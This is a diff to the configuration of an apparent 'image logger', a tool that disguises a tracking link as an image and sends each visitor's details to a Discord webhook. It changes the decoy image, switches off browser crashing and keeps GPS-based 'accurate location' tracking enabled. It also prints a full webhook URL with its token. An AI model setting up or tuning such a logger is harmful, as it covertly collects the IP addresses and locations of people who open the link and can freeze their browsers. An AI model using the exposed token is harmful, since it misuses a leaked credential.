@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1205737474198867988/hoEVT9Ljf7dVcraeLoxDuC6gQ55Rqa3epXYHY_51hyfPW2Ld27TKM94N1UB3vp_hqUS-",
-    "image": "https://en.wikipedia.org/wiki/Main_Page#/media/File:Alexander_Stubb_EPP_October_2018_(44474967285)_(cropped).jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.ibb.co/qNRfYL7/sadass.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -22,14 +22,14 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "It is sad to say this but at this moment i am trying to freeze your laptops browser, this was done by calonerrxsystems™️ this isn't to harm you we will not dox you it's just to find out more about you as its an expiriment", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": False, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
